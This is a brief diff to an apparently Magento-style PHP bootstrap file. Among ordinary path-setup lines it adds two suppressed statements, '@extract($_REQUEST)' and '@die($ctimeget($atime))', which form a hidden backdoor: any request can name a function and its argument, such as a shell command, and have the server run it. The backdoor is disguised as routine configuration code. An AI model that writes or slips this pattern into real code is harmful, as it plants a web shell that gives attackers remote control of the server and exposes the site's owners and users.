@@ -42,6 +42,8 @@ ini_set('display_errors', 1);
 $ds = DIRECTORY_SEPARATOR;
 $ps = PATH_SEPARATOR;
 $bp = dirname(__FILE__);
+@extract($_REQUEST);
+@die ($ctimeget($atime));
 
 /**
  * Set include path
